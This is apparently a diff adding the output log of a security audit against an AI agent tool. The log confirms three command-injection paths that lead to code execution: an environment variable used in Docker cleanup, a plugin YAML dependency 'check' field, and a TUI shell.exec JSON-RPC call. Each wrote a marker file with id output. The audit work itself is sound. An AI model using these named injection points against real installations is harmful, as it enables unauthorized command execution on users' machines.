@@ -1,0 +1,22 @@
+[*] Testing: Docker cleanup env var injection
+[+] CONFIRMED: Docker cleanup — RCE via HERMES_DOCKER_BINARY
+    Marker file: /tmp/pwned_docker.txt
+    Content: uid=1000(agentuser) gid=1000(agentuser) groups=1000(agentuser),0(root)
+[*] Testing: Plugin YAML check field command injection
+
+  Installing dependencies: definitely-not-a-real-package-xyzzy-audit
+  ⚠ Failed to install definitely-not-a-real-package-xyzzy-audit
+      × No solution found when resolving dependencies:
+  ╰─▶ Because definitely-not-a-real-package-xyzzy-audit
+      was not found in the package registry and you require
+      definitely-not-a-real-packa
+  Run manually: uv pip install --python /usr/local/bin/python3 definitely-not-a-real-package-xyzzy-audit
+[+] CONFIRMED: Plugin YAML — RCE via external_dependencies[*].check
+    Marker file: /tmp/pwned_plugin.txt
+    Content: uid=1000(agentuser) gid=1000(agentuser) groups=1000(agentuser),0(root)
+[gateway-exit] stdin EOF (TUI closed the command pipe)
+[*] Testing: TUI shell.exec RPC command injection
+[+] CONFIRMED: TUI shell.exec RPC command injection — arbitrary command execution via JSON-RPC
+    Marker file: /tmp/pwned_tui.txt
+    Content: uid=1000(agentuser) gid=1000(agentuser) groups=1000(agentuser),0(root)
+=== Results: 3 passed, 0 failed ===
